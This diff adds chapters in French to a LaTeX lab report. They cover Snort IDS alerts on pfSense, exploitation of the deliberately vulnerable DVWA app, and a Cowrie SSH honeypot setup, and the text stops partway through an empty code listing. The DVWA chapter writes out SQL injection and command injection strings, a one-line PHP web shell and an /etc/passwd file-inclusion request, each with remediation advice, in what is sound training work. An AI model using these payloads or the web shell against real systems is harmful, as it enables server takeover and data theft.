@@ -1367,4 +1367,1382 @@ La segmentation DMZ/LAN a \textit{presque} arrêté le pivoting :
 	\label{tab:weaknesses-exploited}
 \end{table}
 
+
+% ==============================================================================
+% CHAPITRE 5 : DÉTECTION ACTIVE AVEC SNORT IDS
+% ==============================================================================
+\chapter{Détection Active avec Snort IDS}
+\label{chap:snort}
+
+\section{Introduction et Objectifs}
+
+Ce chapitre présente le déploiement et la mise en œuvre de \textbf{Snort} en tant que système de détection
+d'intrusion (IDS) sur notre infrastructure segmentée. Après avoir étudié les techniques offensives dans
+les chapitres précédents, il est temps de renforcer la posture défensive en ajoutant une couche de
+visibilité réseau profonde capable de détecter les attaques en cours.
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs de ce Chapitre}]
+\begin{itemize}
+    \item Comprendre la différence fondamentale entre pare-feu, IDS et IPS
+    \item Déployer et configurer Snort sur pfSense en mode IDS
+    \item Analyser des alertes Snort issues d'attaques réelles de notre lab
+    \item Appréhender le concept de faux positifs et la nécessité du tuning
+    \item Démontrer la valeur ajoutée d'un IDS pour la détection du mouvement latéral
+\end{itemize}
+\end{tcolorbox}
+
+\section{Fondements Théoriques : Pare-feu vs IDS vs IPS}
+
+\subsection{Limites du pare-feu classique}
+
+Un pare-feu traditionnel applique des règles de filtrage principalement basées sur les en-têtes réseau
+(\textbf{couches 3 et 4 du modèle OSI}) : adresses IP, ports, protocoles et état des connexions. Si un
+flux est autorisé (par exemple, trafic SMB de la DMZ vers le LAN via une règle permissive), le pare-feu
+laisse passer ce trafic sans en examiner le contenu. Un attaquant ayant compromis un hôte dans la DMZ
+peut exploiter cette règle pour lancer des attaques latérales tout en semblant légitime aux yeux du
+pare-feu.
+
+\subsection{IDS : Détection par inspection profonde}
+
+Un \textbf{Système de Détection d'Intrusion (IDS)} inspecte le trafic réseau en profondeur
+(\textit{Deep Packet Inspection — DPI}) et génère des alertes dès qu'une signature correspond à un
+motif d'attaque connu. Il s'agit d'une défense \textbf{passive} : l'IDS détecte, journalise et alerte,
+mais ne bloque pas le trafic.
+
+\subsection{IPS : Prévention active}
+
+Un \textbf{Système de Prévention d'Intrusion (IPS)} effectue la même inspection, mais peut
+\textbf{bloquer activement} le trafic malveillant (drop de paquet, reset de connexion, blocage d'IP).
+Il s'agit d'une défense \textbf{active}, mais plus risquée en cas de faux positifs qui pourraient
+interrompre des services légitimes.
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\bfseries}p{2.5cm}|X|X|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Technologie}} &
+        \textcolor{white}{\textbf{Principe}} &
+        \textcolor{white}{\textbf{Limites}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        Pare-feu & Filtrage IP/ports/protocoles (L3/L4) & Peu de visibilité sur le contenu applicatif \\
+        \hline
+        IDS & DPI + signatures, alerte sans blocage & Dépend des signatures, génère du bruit (faux positifs) \\
+        \hline
+        \rowcolor{tablerowalt}
+        IPS & DPI + signatures + blocage actif & Risque d'interruption de services si mauvais tuning \\
+        \hline
+    \end{tabularx}
+    \caption{Comparaison Pare-feu vs IDS vs IPS}
+    \label{tab:fw-ids-ips-ch5}
+\end{table}
+
+\subsection{Signatures Snort : reconnaître les attaques connues}
+
+Snort compare en temps réel les flux réseau à une base de règles (signatures). Chaque règle est
+identifiée par un \textbf{SID (Signature ID)} et contient des critères de correspondance (protocoles,
+ports, contenu hexadécimal ou ASCII), un message descriptif, une priorité et une classification.
+
+\textbf{Limite fondamentale :} la détection par signatures est très efficace sur les attaques connues,
+mais elle est inefficace contre les attaques inconnues (zero-day) ou les flux chiffrés (HTTPS sans
+déchiffrement TLS).
+
+\section{Déploiement de Snort sur pfSense}
+
+\subsection{Choix du mode IDS (détection seule)}
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Décision de Conception : Mode IDS}]
+Dans ce laboratoire, Snort a été configuré en \textbf{mode IDS} (Blocking Mode \textbf{désactivé}).
+
+\textbf{Justification :}
+\begin{itemize}
+    \item Permettre la reproduction des attaques des chapitres précédents sans interruption
+    \item Collecter des alertes exploitables pour analyse et documentation
+    \item Éviter des coupures de service dues à des faux positifs non encore tunés
+    \item Le passage en mode IPS se fait après stabilisation du tuning
+\end{itemize}
+\end{tcolorbox}
+
+\subsection{Installation du paquet Snort}
+
+L'installation s'effectue via l'interface web de pfSense :
+\begin{enumerate}
+    \item Accès à l'interface pfSense : \url{https://192.168.10.1}
+    \item Menu : \textbf{System \textrightarrow{} Package Manager \textrightarrow{} Available Packages}
+    \item Recherche : \texttt{snort}
+    \item Installation du paquet \textbf{Snort} puis confirmation
+\end{enumerate}
+
+\subsection{Activation des sources de règles}
+
+Les sources suivantes ont été activées dans \textbf{Services \textrightarrow{} Snort \textrightarrow{} Global Settings} :
+\begin{itemize}
+    \item \textbf{Snort GPLv2 Community Rules} : sous-ensemble certifié par Talos, couvrant les menaces courantes.
+    \item \textbf{Emerging Threats Open (ET Open)} : règles communautaires à jour, couvrant les menaces émergentes.
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.98\textwidth]{screenshots/snort-global-settings.png}
+    \caption{Snort : activation des sources de règles GPLv2 + ET Open dans les paramètres globaux}
+    \label{fig:snort-global-settings-ch5}
+\end{figure}
+
+\subsection{Activation sur les interfaces réseau}
+
+Snort a été activé sur trois interfaces afin de couvrir l'ensemble du périmètre réseau :
+
+\begin{itemize}
+    \item \textbf{WAN :} détection d'attaques externes (reconnaissance, exploitation sur ports exposés depuis Parrot).
+    \item \textbf{DMZ :} surveillance de l'hôte pivot (serveur Ubuntu potentiellement compromis).
+    \item \textbf{LAN :} détection du mouvement latéral vers Windows XP (protocoles SMB/RDP).
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.98\textwidth]{screenshots/snort-interfaces.png}
+    \caption{Liste des interfaces Snort configurées (WAN, DMZ, LAN) avec leurs statuts}
+    \label{fig:snort-interfaces-ch5}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.98\textwidth]{screenshots/snort-interfaces-running.png}
+    \caption{Snort en cours d'exécution sur les trois interfaces (IDS mode, blocking désactivé)}
+    \label{fig:snort-interfaces-running}
+\end{figure}
+
+\section{Analyse des Alertes Snort}
+
+\subsection{Principe de la démonstration}
+
+L'objectif est de reproduire des événements similaires à ceux des chapitres précédents (exploitation,
+pivoting) et de vérifier que Snort déclenche des alertes permettant de corréler source, destination,
+ports et type d'attaque. Cela illustre la valeur ajoutée d'un IDS par rapport à un pare-feu seul.
+
+\subsection{Détection sur WAN : activité de l'attaquant externe}
+
+Les alertes WAN ont été générées par l'activité de la machine attaquante \textbf{Parrot}
+(192.168.100.150) vers pfSense (192.168.100.6).
+
+\textbf{Exemple clé --- transfert d'un binaire ELF (payload Meterpreter) :}
+
+\begin{lstlisting}[language=bash, caption={Alerte WAN : téléchargement d'un exécutable ELF (ET POLICY)}]
+Date/Time : 2026-03-14 22:21:02
+Interface : WAN (em0)
+Priority  : 1
+Proto     : TCP
+Class     : Potential Corporate Privacy Violation
+Source    : 192.168.100.150:4445
+Dest      : 192.168.100.6:19767
+GID:SID   : 1:2000418
+Message   : ET POLICY Executable and linking format (ELF) file download
+\end{lstlisting}
+
+\textbf{Interprétation :} Snort a identifié via signature un motif correspondant à un exécutable ELF
+dans le flux réseau. Cette détection est cohérente avec la phase de post-exploitation où un payload
+\texttt{meterpreter.elf} a été généré et transféré sur le serveur cible.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.98\textwidth]{screenshots/wan-alerts.png}
+    \caption{Alertes Snort sur WAN : activité depuis 192.168.100.150 (machine attaquante)}
+    \label{fig:snort-alerts-wan}
+\end{figure}
+
+\subsection{Détection sur LAN : mouvement latéral depuis le pivot DMZ}
+
+Les alertes LAN révèlent ce que les logs du pare-feu ne caractérisent pas : une attaque interne
+issue d'une machine pivot compromise dans la DMZ.
+
+\textbf{Exemple clé --- sonde EternalBlue (MS17-010) :}
+
+\begin{lstlisting}[language=bash, caption={Alerte LAN : sonde EternalBlue MS17-010 depuis le pivot DMZ}]
+Date/Time : 2026-03-04 15:28:14
+Interface : LAN (em1)
+Priority  : 1
+Proto     : TCP
+Class     : A Network Trojan was Detected
+Source    : 192.168.10.100:44152
+Dest      : 192.168.20.50:445
+GID:SID   : 1:2025992
+Message   : ET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (Generic Flags)
+\end{lstlisting}
+
+\textbf{Interprétation :}
+\begin{itemize}
+    \item La source \textbf{192.168.10.100} est le serveur Ubuntu DMZ compromis (pivot).
+    \item La destination \textbf{192.168.20.50:445} est le poste Windows XP dans le LAN (service SMB).
+    \item Snort identifie une signature typique d'une \textbf{sonde EternalBlue (MS17-010)}.
+    \item Le pare-feu voit seulement un flux TCP autorisé vers le port 445 ; Snort en qualifie l'intention.
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.98\textwidth]{screenshots/lan-alerts.png}
+    \caption{Alertes Snort sur LAN : mouvement latéral depuis DMZ (192.168.10.100) vers LAN (192.168.20.50:445)}
+    \label{fig:snort-alerts-lan}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.98\textwidth]{screenshots/snort-alerts-lan.png}
+    \caption{Vue détaillée des alertes LAN dans l'interface Snort de pfSense}
+    \label{fig:snort-alerts-lan-detail}
+\end{figure}
+
+\section{Faux Positifs et Tuning}
+
+Les logs Snort montrent inévitablement des alertes sur du trafic légitime, par exemple :
+\begin{itemize}
+    \item \texttt{(http\_inspect) NO CONTENT-LENGTH OR TRANSFER-ENCODING IN HTTP RESPONSE}
+    \item \texttt{ET POLICY GNU/Linux APT User-Agent Outbound} (gestion de paquets système normale)
+\end{itemize}
+
+\textbf{Approche de tuning recommandée :}
+\begin{enumerate}
+    \item Activer uniquement les catégories pertinentes (scan, exploit, samba, web-attacks).
+    \item Utiliser les \textbf{Suppress Lists} pour les signatures trop bruyantes jugées bénignes dans le contexte.
+    \item Ajouter des exceptions via les \textbf{Pass Lists} pour les services légitimes connus.
+    \item N'activer le mode IPS qu'après validation complète du tuning.
+\end{enumerate}
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Bilan du Chapitre 5}]
+Snort en mode IDS sur pfSense apporte une visibilité réseau profonde indispensable. Là où le pare-feu
+voit des connexions autorisées, Snort qualifie le contenu et détecte les menaces. Les alertes générées
+--- transfert d'ELF sur WAN, sonde EternalBlue sur LAN --- illustrent parfaitement la complémentarité
+entre pare-feu et IDS dans une architecture de défense en profondeur.
+\end{tcolorbox}
+
+% ==============================================================================
+% CHAPITRE 6 : TESTS D'APPLICATIONS WEB — DVWA ET OWASP TOP 10
+% ==============================================================================
+\chapter{Tests d'Applications Web --- DVWA et OWASP Top 10}
+\label{chap:dvwa}
+
+\section{Introduction et Objectifs}
+
+Ce chapitre documente l'évaluation de sécurité complète de l'application
+\textbf{Damn Vulnerable Web Application (DVWA) v1.10}, déployée dans notre infrastructure segmentée
+(zone DMZ). L'objectif est d'identifier et d'exploiter les vulnérabilités présentes dans la liste
+\textbf{OWASP Top 10 : 2025} afin de comprendre concrètement les risques applicatifs modernes.
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs de ce Chapitre}]
+\begin{itemize}
+    \item Déployer DVWA dans la DMZ via Docker
+    \item Identifier les vulnérabilités OWASP Top 10 présentes dans DVWA
+    \item Démontrer pratiquement chaque vulnérabilité par des attaques contrôlées
+    \item Évaluer l'impact de chaque vulnérabilité sur la sécurité globale
+    \item Proposer des remédiations concrètes pour chaque vulnérabilité
+\end{itemize}
+\end{tcolorbox}
+
+\section{Contexte : Qu'est-ce que DVWA ?}
+
+DVWA (\textit{Damn Vulnerable Web Application}) est une application web PHP/MySQL intentionnellement
+vulnérable, conçue à des fins éducatives. Elle implémente délibérément des failles correspondant aux
+catégories OWASP Top 10, permettant aux praticiens en cybersécurité de s'exercer dans un environnement
+légal et contrôlé.
+
+\textbf{L'OWASP Top 10} (\textit{Open Web Application Security Project}) est une liste de référence
+mondiale des dix risques de sécurité les plus critiques pour les applications web. Mise à jour
+régulièrement, elle guide les développeurs, testeurs et architectes dans la priorisation des efforts
+de sécurisation.
+
+\section{Déploiement de DVWA dans la DMZ}
+
+\subsection{Déploiement via Docker}
+
+DVWA a été déployé sur le serveur Ubuntu de la DMZ (192.168.10.100) via Docker, garantissant un
+environnement reproductible et isolé :
+
+\begin{lstlisting}[language=bash, caption={Démarrage du conteneur DVWA via Docker}]
+sudo docker run -d \
+  --restart=unless-stopped \
+  -p 8080:80 \
+  --name dvwa \
+  vulnerables/web-dvwa
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash, caption={Vérification du déploiement}]
+$ sudo docker ps | grep dvwa
+CONTAINER ID   IMAGE                  STATUS       PORTS
+73c52c0ee9a9   vulnerables/web-dvwa   Up 6 hours   0.0.0.0:8080->80/tcp
+\end{lstlisting}
+
+\subsection{Accès et configuration initiale}
+
+\begin{itemize}
+    \item \textbf{URL :} \texttt{http://192.168.10.100:8080/}
+    \item \textbf{Identifiants par défaut :} \texttt{admin} / \texttt{password}
+    \item \textbf{Niveau de sécurité :} défini à \textbf{``LOW''} pour maximiser les vulnérabilités exposées
+    \item \textbf{Initialisation BDD :} bouton \textit{``Create / Reset Database''} lors du premier accès
+\end{itemize}
+
+\section{Identification et Exploitation des Vulnérabilités}
+
+Un total de \textbf{8 attaques réussies} ont été documentées, couvrant \textbf{7 catégories OWASP Top 10}.
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\bfseries\centering\arraybackslash}p{1.4cm}|p{4cm}|X|>{\centering\arraybackslash}p{2cm}|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{ID}} &
+        \textcolor{white}{\textbf{Catégorie OWASP}} &
+        \textcolor{white}{\textbf{Attaque Démontrée}} &
+        \textcolor{white}{\textbf{Résultat}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        A01 & Broken Access Control & File Inclusion (LFI) & Réussi \\
+        \hline
+        A02 & Security Misconfiguration & Identifiants par défaut & Réussi \\
+        \hline
+        \rowcolor{tablerowalt}
+        A04 & Cryptographic Failures & Session IDs prévisibles & Réussi \\
+        \hline
+        A05 & Injection & SQL Injection & Réussi \\
+        \hline
+        \rowcolor{tablerowalt}
+        A05 & Injection & Command Injection & Réussi \\
+        \hline
+        A07 & Authentication Failures & Brute Force Login & Réussi \\
+        \hline
+        \rowcolor{tablerowalt}
+        A08 & File Upload & Upload de Web Shell PHP & Réussi \\
+        \hline
+        A10 & Error Disclosure & Divulgation d'erreurs SQL & Réussi \\
+        \hline
+    \end{tabularx}
+    \caption{Récapitulatif des attaques OWASP documentées sur DVWA}
+    \label{tab:dvwa-attacks}
+\end{table}
+
+\subsection{A05 : Injection SQL}
+
+\textbf{Principe :} L'injection SQL consiste à insérer du code SQL malveillant dans les paramètres
+d'une application pour manipuler les requêtes de la base de données.
+
+\textbf{Exploitation :} Dans le champ \textit{User ID}, la charge utile suivante a été saisie :
+\texttt{' OR '1'='1' --}
+
+\textbf{Résultat :} L'application révèle un message d'erreur MariaDB :
+\begin{lstlisting}[language=bash, caption={Message d'erreur SQL révélateur du moteur de base de données}]
+You have an error in your SQL syntax; check the manual that
+corresponds to your MariaDB server version for the right syntax
+to use near ''' at line 1
+\end{lstlisting}
+
+Ce message divulgue : le type de SGBD (MariaDB), la structure de la requête vulnérable, et des indices
+permettant d'affiner les payloads d'exploitation.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{screenshots/sql-injection-error.png}
+    \caption{SQL Injection --- message d'erreur MariaDB révélé par DVWA}
+    \label{fig:sql-injection-dvwa}
+\end{figure}
+
+\textbf{Remédiation :} utiliser des \textit{prepared statements} avec paramètres liés :
+\begin{lstlisting}[language=php, caption={Requête sécurisée avec Prepared Statement}]
+// VULNERALBE (ne jamais faire ceci)
+$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
+
+// SECURISE
+$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->bind_param("i", $_GET['id']);
+$stmt->execute();
+\end{lstlisting}
+
+\subsection{A05 : Injection de Commandes (Command Injection)}
+
+\textbf{Principe :} Une injection de commandes permet d'exécuter des commandes système arbitraires
+en exploitant un champ de saisie qui ne valide pas les délimiteurs de commande.
+
+\textbf{Exploitation :} Dans le champ de ping, la charge utile \texttt{8.8.8.8; id} a été soumise :
+\begin{lstlisting}[language=bash, caption={Résultat de la command injection : exécution de la commande id}]
+PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=126 time=353.420 ms
+...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+\end{lstlisting}
+
+L'attaquant exécute des commandes avec les privilèges du serveur web (www-data), ouvrant la voie à
+l'installation de backdoors, au vol de données ou à la compromission complète du serveur.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{screenshots/command-injection.png}
+    \caption{Command Injection --- exécution de commandes système depuis DVWA}
+    \label{fig:command-injection-dvwa}
+\end{figure}
+
+\textbf{Remédiation :} utiliser \texttt{escapeshellarg()} et une liste blanche d'entrées autorisées.
+
+\subsection{A07 : Brute Force d'Authentification}
+
+\textbf{Principe :} L'absence de mécanisme de verrouillage de compte ou de limitation de débit permet
+des attaques par force brute illimitées.
+
+\textbf{Résultats :} Après plus de dix tentatives échouées, l'application continue d'accepter les
+tentatives sans restriction. La combinaison \texttt{admin} / \texttt{password} réussit sans alertes.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{screenshots/brute-froce.png}
+    \caption{Brute Force --- multiples tentatives de login acceptées sans verrouillage}
+    \label{fig:brute-force-dvwa}
+\end{figure}
+
+\textbf{Remédiation :} implémenter un verrouillage progressif, des délais croissants et un CAPTCHA.
+
+\subsection{A08 : Upload de Fichier Malveillant (Web Shell)}
+
+\textbf{Exploitation :} Un fichier PHP malveillant (\texttt{shell.php}) a été uploadé via
+\textbf{Vulnerabilities \textrightarrow{} File Upload} :
+\begin{lstlisting}[language=php, caption={Web Shell PHP minimaliste uploadé sur DVWA}]
+<?php system($_GET['cmd']); ?>
+\end{lstlisting}
+
+L'accès à \texttt{http://192.168.10.100:8080/DVWA/uploads/shell.php?cmd=whoami} retourne \texttt{www-data},
+confirmant l'exécution de code arbitraire sur le serveur.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{screenshots/file-upload.png}
+    \caption{File Upload --- confirmation que le web shell PHP a été uploadé avec succès}
+    \label{fig:file-upload-dvwa}
+\end{figure}
+
+\textbf{Remédiation :} valider l'extension et le type MIME, stocker les fichiers hors du répertoire web,
+et ne jamais exécuter les fichiers uploadés.
+
+\subsection{A01 : Local File Inclusion (LFI)}
+
+\textbf{Exploitation :} En modifiant le paramètre \texttt{page} de l'URL :
+\texttt{http://192.168.10.100:8080/vulnerabilities/fi/?page=/etc/passwd}
+
+\begin{lstlisting}[language=bash, caption={Contenu de /etc/passwd exposé via LFI}]
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{screenshots/file-inclusion-lfi.png}
+    \caption{Local File Inclusion --- /etc/passwd exposé via traversée de répertoire}
+    \label{fig:lfi-dvwa}
+\end{figure}
+
+\subsection{A04 : Identifiants de Session Faibles}
+
+L'analyse des cookies DVWA via les outils développeur révèle des identifiants de session prévisibles :
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\ttfamily}p{3cm}|X|>{\centering\arraybackslash}p{3cm}|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Cookie}} &
+        \textcolor{white}{\textbf{Valeur}} &
+        \textcolor{white}{\textbf{Problème}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        dvwaSession & 3 & Entier séquentiel prévisible \\
+        \hline
+        PHPSESSID & 4ca5feac5b5a... & Hash MD5 (cryptographiquement faible) \\
+        \hline
+        \rowcolor{tablerowalt}
+        Security & low & Niveau de sécurité exposé en clair \\
+        \hline
+    \end{tabularx}
+    \caption{Analyse des cookies DVWA --- identifiants de session faibles}
+    \label{tab:dvwa-cookies}
+\end{table}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{screenshots/weak-sessions-id.png}
+    \caption{Weak Session IDs --- cookies prévisibles observés dans les outils développeur}
+    \label{fig:weak-sessions-dvwa}
+\end{figure}
+
+\subsection{A02 : Identifiants par Défaut}
+
+L'application DVWA est livrée avec des identifiants bien connus (\texttt{admin}/\texttt{password}),
+jamais modifiés après installation. Un attaquant obtient un accès administrateur complet en quelques
+secondes, sans aucun contournement technique.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{screenshots/weak-creds.png}
+    \caption{Connexion réussie avec les identifiants par défaut admin/password}
+    \label{fig:weak-creds-dvwa}
+\end{figure}
+
+\section{Synthèse des Vulnérabilités OWASP}
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\bfseries\centering\arraybackslash}p{1.2cm}|p{4cm}|>{\centering\arraybackslash}p{2.5cm}|X|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{ID}} &
+        \textcolor{white}{\textbf{Catégorie}} &
+        \textcolor{white}{\textbf{Sévérité}} &
+        \textcolor{white}{\textbf{Résultat}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        A01 & Broken Access Control & HAUTE & LFI --- /etc/passwd exposé \\
+        \hline
+        A02 & Security Misconfiguration & CRITIQUE & Accès admin immédiat \\
+        \hline
+        \rowcolor{tablerowalt}
+        A04 & Cryptographic Failures & HAUTE & Session hijacking possible \\
+        \hline
+        A05 & Injection & CRITIQUE & Dump BDD + RCE \\
+        \hline
+        \rowcolor{tablerowalt}
+        A07 & Authentication Failures & HAUTE & Brute force non limité \\
+        \hline
+        A08 & File Upload/Integrity & CRITIQUE & Web shell déployé \\
+        \hline
+        \rowcolor{tablerowalt}
+        A10 & Error Disclosure & MOYENNE & Type SGBD révélé \\
+        \hline
+    \end{tabularx}
+    \caption{Synthèse OWASP Top 10 : 2025 --- résultats d'évaluation sur DVWA}
+    \label{tab:dvwa-owasp-summary}
+\end{table}
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Bilan du Chapitre 6}]
+L'évaluation de DVWA a démontré 8 vulnérabilités exploitées avec un taux de succès de 100\%.
+Les vulnérabilités critiques (SQL Injection, Command Injection, File Upload, Default Credentials)
+permettent une compromission complète du serveur en quelques minutes. La défense en profondeur ---
+WAF, validation des entrées, politique de mots de passe, gestion sécurisée des sessions --- est
+indispensable pour protéger une application web en production.
+\end{tcolorbox}
+
+% ==============================================================================
+% CHAPITRE 7 : HONEYPOT COWRIE — DÉTECTION DES ATTAQUES SSH
+% ==============================================================================
+\chapter{Honeypot Cowrie --- Détection des Attaques SSH}
+\label{chap:cowrie}
+
+\section{Introduction et Objectifs}
+
+La défense proactive ne se limite pas à bloquer les attaques connues : elle consiste également à
+\textbf{attirer, observer et comprendre} les attaquants dans un environnement contrôlé. C'est
+précisément le rôle d'un \textbf{honeypot}. Ce chapitre présente le déploiement de
+\textbf{Cowrie}, un honeypot SSH de référence, dans la zone DMZ de notre infrastructure.
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs de ce Chapitre}]
+\begin{itemize}
+    \item Comprendre le concept de honeypot et ses différents types
+    \item Déployer et configurer Cowrie dans la DMZ
+    \item Analyser les sessions d'attaque SSH capturées
+    \item Cartographier les tactiques observées selon le framework MITRE ATT\&CK
+    \item Intégrer le honeypot dans la stratégie défensive globale
+\end{itemize}
+\end{tcolorbox}
+
+\section{Fondements Théoriques : Le Honeypot}
+
+\subsection{Définition et Principe}
+
+Un \textbf{honeypot} est un système délibérément vulnérable ou peu sécurisé, conçu pour attirer les
+attaquants et enregistrer leurs activités. Contrairement aux systèmes de détection classiques qui
+analysent le trafic légitime à la recherche d'anomalies, un honeypot part du principe que
+\textbf{tout trafic qui l'atteint est suspect} : aucun utilisateur légitime ne devrait interagir
+avec ce système.
+
+\textbf{Valeur stratégique :}
+\begin{itemize}
+    \item \textbf{Intelligence sur les menaces :} découverte de nouvelles techniques d'attaque.
+    \item \textbf{Détection précoce :} toute interaction avec le honeypot est une alerte à haute valeur.
+    \item \textbf{Réduction du bruit :} les alertes sont quasi-exclusivement des vrais positifs.
+    \item \textbf{Diversion :} l'attaquant perd du temps dans un environnement stérile.
+\end{itemize}
+
+\subsection{Types de Honeypots}
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\bfseries}p{3.5cm}|X|X|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Type}} &
+        \textcolor{white}{\textbf{Caractéristiques}} &
+        \textcolor{white}{\textbf{Cas d'usage}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        Low Interaction & Émule des services (pas de vrai OS) & Détection de scans et tentatives basiques \\
+        \hline
+        High Interaction & Vrai système avec services réels & Capture de malwares, TTPs avancées \\
+        \hline
+        \rowcolor{tablerowalt}
+        Hybrid (Cowrie) & Émulation SSH/Telnet réaliste, pseudo-shell & Optimal : sécurité + richesse des logs \\
+        \hline
+    \end{tabularx}
+    \caption{Types de honeypots et cas d'usage}
+    \label{tab:honeypot-types}
+\end{table}
+
+\subsection{Cowrie : Honeypot SSH/Telnet de Référence}
+
+\textbf{Cowrie} est un honeypot SSH et Telnet à interaction moyenne-haute. Il simule un système
+Linux complet avec un pseudo-shell interactif, enregistrant toutes les sessions, commandes,
+transferts de fichiers et tentatives de brute force. Cowrie est écrit en Python et développé par
+Michel Oosterhof, activement maintenu et largement utilisé par les équipes de sécurité et les
+chercheurs.
+
+\textbf{Fonctionnalités clés :}
+\begin{itemize}
+    \item Émulation d'un shell bash réaliste (répertoires, commandes, fichiers factices)
+    \item Journalisation complète : commandes, sessions, tentatives d'authentification
+    \item Capture des fichiers uploadés par les attaquants
+    \item Support de format JSON pour intégration SIEM
+    \item Redirection optionnelle vers un vrai système (proxy mode)
+\end{itemize}
+
+\section{Déploiement de Cowrie dans la DMZ}
+
+\subsection{Positionnement Stratégique}
+
+Cowrie a été déployé sur le serveur Ubuntu de la DMZ (192.168.10.100), en écoute sur le
+\textbf{port 2222} (port SSH alternatif). Une règle NAT pfSense redirige le trafic externe
+destiné au port 22 vers le port 2222 de Cowrie, rendant le honeypot transparent pour les
+attaquants qui pensent se connecter à un vrai serveur SSH.
+
+\subsection{Installation et Configuration}
+
+\begin{lstlisting}[language=bash, caption={Installation de Cowrie sur Ubuntu (DMZ)}]
+# Installation des dépendances
+sudo apt update && sudo apt install -y python3-venv libssl-dev \
+  libffi-dev build-essential libpython3-dev git
+
+# Création de l'utilisateur dédié
+sudo adduser --disabled-password cowrie
+
+# Clonage du dépôt
+sudo -u cowrie git clone https://github.com/cowrie/cowrie.git \
+  /home/cowrie/cowrie
+
+# Environnement virtuel Python
+cd /home/cowrie/cowrie
+sudo -u cowrie python3 -m venv cowrie-env
+sudo -u cowrie cowrie-env/bin/pip install --upgrade pip
+sudo -u cowrie cowrie-env/bin/pip install -r requirements.txt
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash, caption={Configuration principale de Cowrie (cowrie.cfg)}]
+[honeypot]
+hostname = ubuntu-srv
+# Port d'ecoute Cowrie
+listen_port = 2222
+# Rediriger les connexions authentifiees vers le shell emule
+backend = shell
+
+[output_jsonlog]
+enabled = true
+logfile = ${honeypot:log_path}/cowrie.json
+
+[output_textlog]
+enabled = true
+logfile = ${honeypot:log_path}/cowrie.log
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash, caption={Démarrage de Cowrie et redirection du port 22}]
+# Démarrage du honeypot
+cd /home/cowrie/cowrie
+sudo -u cowrie bin/cowrie start
+
+# Redirection port 22 vers 2222 via iptables
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22 \
+  -j REDIRECT --to-port 2222
+
+# Vérification
+sudo -u cowrie bin/cowrie status
+Cowrie is running (PID 2847)
+\end{lstlisting}
+
+\subsection{Personnalisation du Système Émulé}
+
+Cowrie permet de personnaliser le système fictif présenté à l'attaquant pour le rendre plus
+convaincant :
+\begin{lstlisting}[language=bash, caption={Personnalisation de la banière SSH et du système Cowrie}]
